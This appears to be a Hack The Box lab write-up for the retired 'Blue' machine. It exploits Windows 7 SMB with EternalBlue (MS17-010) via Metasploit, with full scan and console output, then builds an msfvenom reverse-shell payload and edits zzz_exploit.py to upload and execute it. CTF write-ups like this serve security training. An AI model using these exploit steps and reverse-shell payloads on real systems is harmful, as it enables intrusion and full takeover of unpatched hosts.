@@ -1,0 +1,153 @@
+#HackTheBox
+#Retired Box
+#Blue
+
+Initial Scan:
+
+kali@kali:~$ nmap 10.10.10.40 -sV -A -T4
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-02 01:55 EST
+Nmap scan report for 10.10.10.40
+Host is up (0.11s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 12m19s, deviation: 1s, median: 12m18s
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-02-02T07:09:11+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-02T07:09:13
+|_  start_date: 2021-02-01T09:28:50
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 83.61 seconds
+
+It looks like the box is running Windows 7 and SMB. Judging by the name of this box we will probably have to use Eternal Blue on this one. Let's see.
+
+There's an msf module available online. (MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption, at https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) 
+
+We can use it to exploit smb and see if we can get a meterpreter session. The exploit page on rapid7's site says one may need to run it several times until it is successfully triggered.
+
+Let's set the options and run the module.
+
+	msfconsole
+	msf5 > use exploit/windows/smb/ms17_010_psexec 
+	msf5 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.2
+	LHOST => 10.10.14.2
+	msf5 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
+	RHOSTS => 10.10.10.40
+	msf5 exploit(windows/smb/ms17_010_psexec) > set RPORT 445
+	RPORT => 445
+	msf5 exploit(windows/smb/ms17_010_psexec) > 
+	msf5 exploit(windows/smb/ms17_010_psexec) > run
+
+	[*] Started reverse TCP handler on 10.10.14.2:4444 
+	[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
+	[-] 10.10.10.40:445 - Timeout::Error
+	[-] 10.10.10.40:445 - execution expired
+
+The exploit failed. Let's try again.
+
+	[*] Exploit completed, but no session was created.
+	msf5 exploit(windows/smb/ms17_010_psexec) > 
+	msf5 exploit(windows/smb/ms17_010_psexec) > 
+	msf5 exploit(windows/smb/ms17_010_psexec) > 
+	msf5 exploit(windows/smb/ms17_010_psexec) > run
+
+	[*] Started reverse TCP handler on 10.10.14.2:4444 
+	[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
+	[*] 10.10.10.40:445 - Built a write-what-where primitive...
+	[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
+	[*] 10.10.10.40:445 - Selecting PowerShell target
+	[*] 10.10.10.40:445 - Executing the payload...
+	[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
+	[*] Sending stage (176195 bytes) to 10.10.10.40
+	[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49158) at 2021-02-02 02:24:11 -0500
+
+	meterpreter > 
+
+There we go. Let's get those flags.
+
+meterpreter > cd Desktop 
+meterpreter > dir
+Listing: C:\Users\haris\Desktop
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2017-07-14 09:45:52 -0400  desktop.ini
+100666/rw-rw-rw-  32    fil   2017-07-21 02:54:02 -0400  user.txt
+
+meterpreter > cat user.txt 
+[user flag]
+
+Now, let's get the root flag. We got admin rights... right away. No need to privesc!
+No wonder Wanna Cry was such a big deal.
+
+meterpreter > dir
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2017-07-21 02:56:36 -0400  desktop.ini
+100444/r--r--r--  32    fil   2017-07-21 02:56:49 -0400  root.txt
+
+meterpreter > type root.txt
+[-] Unknown command: type.
+meterpreter > cat root.txt 
+[root flag]
+
+Easy as pie. It's a pretty fun box, and I always wanted to see Eternal Blue in action. 
+
+There's another exploit that can do the job. See https://github.com/worawit/MS17-010
+
+The script zzz_exploit.py is what we need. All we have to do is set the USERNAME variable to '\\' and modify the smb_pwn function.
+
+Before modifying the function we have to create our payload, we can use msfvenom.
+
+	msfvenom -pwindows/meterpreter/reverse_tcp lhost=10.10.14.2 lport=4444 -f exe > payload.exe
+
+Now we just need to change the file name on smb_pwn and the command to execute like so:
+
+	smb_send_file(smbConn,'/home/kali/CTF/HTB/Machines/Blue/payload.exe', 'C', '/payload.exe')
+	service_exec(conn, r'cmd /c c:\\payload.exe')
+
+We setup a listener with netcat and run the exploit and voila, we get a connection from the box.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
